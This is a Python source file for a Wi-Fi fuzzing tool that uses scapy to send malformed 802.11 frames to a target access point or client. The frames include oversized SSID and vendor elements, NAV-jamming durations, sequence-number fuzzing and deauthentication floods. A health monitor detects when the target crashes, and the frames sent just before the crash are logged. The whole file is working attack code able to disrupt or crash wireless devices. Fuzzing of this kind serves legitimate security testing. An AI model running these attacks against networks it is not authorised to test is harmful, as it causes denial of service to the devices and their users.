import random
import sys
import argparse
import time
from collections import deque
from scapy.all import Dot11, RandString, sendp, RadioTap, Dot11Elt, Dot11Deauth

from DeviceHealthMonitor import DeviceHealthMonitor
from SeqFuzz import SeqFuzz, SeqFuzzMode

IFS = 0.05  # Inter-frame spacing in seconds (intensity)
MONITOR_TIMEOUT = 2  # Time in seconds to consider the target unresponsive

class FrameFactory:
    @staticmethod
    def get_base():
        return Dot11Elt(ID=0, info="") / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
    @staticmethod
    def get_ssid_too_long():
        random_len = random.randint(0, 255)
        payload = random.randbytes(500)
        return Dot11Elt(ID=0, len=random_len, info=payload) / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
    @staticmethod
    def get_ssid_duplication():
        ssid = "TestSSID"
        return Dot11Elt(ID=0, len=len(ssid), info=ssid) / Dot11Elt(ID=0, len=len(ssid), info=ssid) / Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
    @staticmethod
    def get_random_id():
        rid = random.randint(0, 255)
        return Dot11Elt(ID=rid, len=random.randint(150, 255), info=RandString(10))
    @staticmethod
    def get_vendor_specific():
        random_len = random.randint(1, 255)
        base = FrameFactory.get_base()
        return Dot11Elt(ID=221, len=random_len, info=random.randbytes(1000)) / base
    @staticmethod
    def get_nav_jamming():
        return random.randint(10000, 65535)
    @staticmethod
    def get_deauth():
        reason_code = random.randint(0, 65535)
        return Dot11Deauth(reason=reason_code)

attacks = {
    "ssid-len": (0, 4, FrameFactory.get_ssid_too_long),
    "ssid-duplication": (0, 4, FrameFactory.get_ssid_duplication),
    "random-id": (0, 4, FrameFactory.get_random_id),
    "vendor-specific": (0, 4, FrameFactory.get_vendor_specific),
    "nav-jamming": (2, 4, FrameFactory.get_nav_jamming),
    "seq-fuzz": (0, 4, lambda: None),
    "deauth": (0, 12, FrameFactory.get_deauth)
}

def send_malformed_frame(dev_mac, iface, attack, seq_fuzzer=None):
    """Sends a malformed frame to the target device based on the specified attack type."""
    client_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    if attack not in attacks: return

    type, subtype, payload = attacks[attack]

    dot11 = Dot11(type=type, subtype=subtype, addr1=dev_mac, addr2=client_mac, addr3=dev_mac)
        
    if attack == "seq-fuzz":
        dot11.SC = (seq_fuzzer.next() << 4) | 0
        packet = RadioTap() / dot11 / FrameFactory.get_base()
    elif attack == "nav-jamming":
        dot11.ID = payload()
        packet = RadioTap() / dot11
    else:    
        packet = RadioTap() / dot11 / payload()
    
    sendp(packet, iface=iface, verbose=False)
    return packet

def main():
    parser = argparse.ArgumentParser(description="Wi-Fi Fuzzer tool.", epilog="Example usage: python fuzzer.py -a 02:00:00:00:00:00 -i wlan0")
    parser.add_argument("-a", "--ap-mac", help="MAC address of the targeted AP device")
    parser.add_argument("-c", "--client-mac", help="MAC address of the STA client device")
    parser.add_argument("-i", "--iface", default="wlan0", help="Wireless interface to use set to monitor mode (default: wlan0)")
    parser.add_argument("-m", "--mode", choices=["ssid-len", "ssid-duplication", "random-id", "vendor-specific", "nav-jamming", "seq-fuzz", "deauth"], default="ssid-len", help="Fuzzing mode: 'ssid-len' for probe requests, 'ssid-duplication' for duplicate SSIDs, 'random-id' for random element IDs, 'nav-jamming' for NAV jamming, 'seq-fuzz' for sequence number fuzzing, 'deauth' for deauthentication frames (default: ssid-len)")
    parser.add_argument("-I", "--intensity", type=float, default=0.05, help="IFS (Inter-frame spacing) in seconds (default: 0.05)")
    parser.add_argument("--log-csv", action="store_true", help="Enable CSV logging of device health data")
    args = parser.parse_args()

    global IFS
    IFS = args.intensity

    target_type = "AP" if args.ap_mac else "STA"

    device_mac = args.client_mac if args.client_mac else args.ap_mac
    if not device_mac:
        print("Error: You must specify either an AP MAC address or a client MAC address.")
        parser.print_help()
        sys.exit(1)

    print(f"[*] Starting fuzzing device {device_mac} on interface {args.iface}")
    print("[!] Press Ctrl+C to stop.")

    # Initialize the device health monitor
    monitor = DeviceHealthMonitor(device_mac, args.iface, target_type=target_type, log_csv=True if args.log_csv else False)
    monitor.start()

    # Initialize sequence number fuzzer if needed
    if args.mode == "seq-fuzz":
        seq_fuzzer = None
        current_seq_modes = iter(SeqFuzzMode)

    # queue for storing sent frames to identify successful hit
    history = deque(maxlen=int(1/IFS * MONITOR_TIMEOUT))
    time_of_death = 0
    count = 0

    try:
        while True:
            if not monitor.is_target_alive(timeout=MONITOR_TIMEOUT):
                print(f"[!] Target {device_mac} is not responding.")
                print(f"[*] Crash detected after {count} fuzzed frames.")
                if not monitor.active_probe():
                    time_of_death = monitor.last_seen
                    print("[*] Active probe failed, confirming target is unresponsive. Stopping fuzzing.")
                    break
                else:
                    monitor.last_seen = time.time()  # Reset last seen to avoid false positives


            if args.mode == "seq-fuzz":
                # SeqFuzz non existent or end of sequence reached, switch to next mode
                if seq_fuzzer == None or not seq_fuzzer.is_running():
                    try:
                        seq_fuzz_mode = next(current_seq_modes)
                        seq_fuzzer = SeqFuzz(seq_fuzz_mode)
                    except StopIteration:
                        print("[*] All sequence fuzzing modes exhausted. Stopping fuzzing.")
                        break
                fuzzed_frame_timestamp = time.time()
                fuzzed_frame = send_malformed_frame(device_mac, args.iface, args.mode, seq_fuzzer)
            else:
                # Stateless attack modes
                fuzzed_frame_timestamp = time.time()
                fuzzed_frame = send_malformed_frame(device_mac, args.iface, args.mode)

            history.append((fuzzed_frame, fuzzed_frame_timestamp))

            time.sleep(IFS)
            count += 1
            if count % 100 == 0:
                print(f"[*] Sent {count} malformed frames so far...")
                
    except KeyboardInterrupt:
        print("\nFuzzing stopped by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        print(f"\nStopping monitor.")
        if time_of_death != 0:
            for frame, timestamp in history:
                if timestamp >= time_of_death - 0.5 and timestamp <= time_of_death + 0.5:
                    print(f"Potential crash-inducing frame sent at {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}:")
                    print(f"{frame.summary()}\n"
                            f"ID: {frame[Dot11].ID if Dot11 in frame else 'N/A'} |"
                            f"Seq: {frame[Dot11].SC >> 4 if Dot11 in frame else 'N/A'} |"
                            f"Reason: {frame[Dot11Deauth].reason if Dot11Deauth in frame else 'N/A'} |"
                            f"Len: {len(frame)}")
        monitor.stop()

if __name__ == "__main__":
    main()
    